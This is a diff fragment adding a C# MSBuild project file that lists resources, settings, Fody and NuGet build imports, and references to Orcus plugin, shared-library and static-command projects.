+    <EmbeddedResource Include="StaticCommands\SystemLock\SystemLockForm.resx">
+      <DependentUpon>SystemLockForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="app.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="FodyWeavers.xml" />
+    <Content Include="Resources\ConnectEnvironment.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Libraries\DirectoryInfoEx\DirectoryInfoEx.csproj">
+      <Project>{09df5a9a-989e-410c-ba72-5a94cf481e57}</Project>
+      <Name>DirectoryInfoEx</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Libraries\OpusWrapper\OpusWrapper.csproj">
+      <Project>{f07d69a2-8847-4ade-b9c6-05345cc8ed5b}</Project>
+      <Name>OpusWrapper</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Libraries\ShellLibrary\ShellLibrary.csproj">
+      <Project>{9c3372d3-d5e1-4d95-a0cb-cd8fdab3131d}</Project>
+      <Name>ShellLibrary</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Plugins\Orcus.Plugins.csproj">
+      <Project>{0D743E5D-0D5F-4B9B-B2DF-1F607B5031C4}</Project>
+      <Name>Orcus.Plugins</Name>
+      <Private>True</Private>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared.Utilities\Orcus.Shared.Utilities.csproj">
+      <Project>{E23E8C6F-6F71-4954-8A42-FBA873B86E5E}</Project>
+      <Name>Orcus.Shared.Utilities</Name>
+      <Private>True</Private>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared\Orcus.Shared.csproj">
+      <Project>{4030F3BD-8F20-483B-B87B-C1BE34DBEBFC}</Project>
+      <Name>Orcus.Shared</Name>
+      <Private>True</Private>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.StaticCommands\Orcus.StaticCommands.csproj">
+      <Project>{8a420d43-c212-4981-8df1-eed79fdea1cf}</Project>
+      <Name>Orcus.StaticCommands</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Target Name="AfterBuild">
+    <MSBuild Condition="'$(TargetFrameworkVersion)' != 'v4.5' And '$(TargetFrameworkVersion)' != 'v4.0'" Projects="$(MSBuildProjectFile)" Properties="TargetFrameworkVersion=v4.5" RunEachTargetSeparately="true" />
+    <MSBuild Condition="'$(TargetFrameworkVersion)' != 'v4.5' And '$(TargetFrameworkVersion)' != 'v4.0'" Projects="$(MSBuildProjectFile)" Properties="TargetFrameworkVersion=v4.0" RunEachTargetSeparately="true" />
+  </Target>
+  <Import Project="..\packages\Fody.1.29.4\build\portable-net+sl+win+wpa+wp\Fody.targets" Condition="Exists('..\packages\Fody.1.29.4\build\portable-net+sl+win+wpa+wp\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Fody.1.29.4\build\portable-net+sl+win+wpa+wp\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.1.29.4\build\portable-net+sl+win+wpa+wp\Fody.targets'))" />
+  </Target>
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
